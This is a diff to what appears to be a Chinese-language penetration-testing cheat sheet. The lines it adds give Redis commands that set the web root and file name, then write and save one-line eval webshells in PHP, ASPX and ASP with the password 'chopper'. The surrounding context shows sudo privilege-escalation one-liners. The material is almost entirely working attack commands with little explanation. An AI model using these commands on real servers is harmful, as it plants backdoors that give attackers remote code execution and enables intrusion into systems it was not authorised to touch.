@@ -727,7 +727,16 @@ perl -e 'print(("A" x 100 . "\x{00}") x 50)' | sudo -S id
 while :; do ./lucky0 -q && break; done
 sudo -s
 ```
-
+# redis写webshell
+利用前提:开了web并且知道路径（如利用phpinfo）
+```
+config set dir /home/wwwroot/default/	//设置路径
+config set dbfilename redis.php	  //设置文件名
+set webshell "<?php @eval($_POST['chopper']);?>"	//写入后门代码
+set webshell "<%@ Page Language=\"Jscript\"%><%eval(Request.Item[\"chopper\"],\"unsafe\");%>"	//aspx，注意双引号使用\
+set webshell "<%eval request(\"chopper\")%>"	//asp，注意双引号使用\
+save	//保存
+```
 # postgresql命令执行
 使用数据库获取系统信息
 ```
